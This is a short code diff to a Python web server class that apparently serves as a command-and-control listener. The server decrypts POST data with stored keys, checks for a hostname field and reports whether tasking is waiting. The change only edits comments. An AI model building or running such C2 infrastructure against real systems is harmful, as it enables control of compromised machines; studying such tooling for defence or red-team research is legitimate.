@@ -122,8 +122,8 @@ class WebServer(object):
                 # tries to decrypt using each key
                 for row in results:
                     # if successful decryption
-                    # saves encryption key as a variable
                     if "hostname" in self.crypt(row[0], raw_data):
+                        # saves encryption key as a variable
                         key = row[0]
 
                         # JSON decodes POST data
@@ -156,7 +156,7 @@ class WebServer(object):
                             return "we have tasking"
 
                         # else we return a blank response
-                        # Flask will error if we do not have a response
+                        # Flask will error if we do not return a response
                         else:
                             return ""
 
